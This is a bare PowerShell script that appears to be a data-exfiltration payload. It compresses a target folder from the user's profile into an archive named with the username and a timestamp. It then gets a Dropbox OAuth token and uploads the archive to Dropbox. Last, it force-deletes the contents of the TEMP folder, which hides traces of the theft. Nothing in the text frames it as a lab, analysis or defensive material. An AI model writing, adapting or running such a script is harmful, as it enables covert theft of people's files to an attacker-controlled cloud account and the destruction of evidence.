$ZIP = "$env:USERNAME-Data-$(get-date -f yyyy-MM-dd_hh-mm-ss).zip"

Compress-Archive -Path $env:USERPROFILE\$Target -DestinationPath $env:TMP\$ZIP

function get_access_token {
    $Body = @{
        grant_type    = "refresh_token"
	refresh_token = $refresh_token
        client_id     = $app_key
        client_secret = $app_secret
    }
    
    $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"

    return $response.access_token
}

function Upload-to-DropBox {
    $TargetFilePath="/$ZIP"
    $SourceFilePath="$env:TEMP\$ZIP"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $db = get_access_token
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

Upload-to-DropBox

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue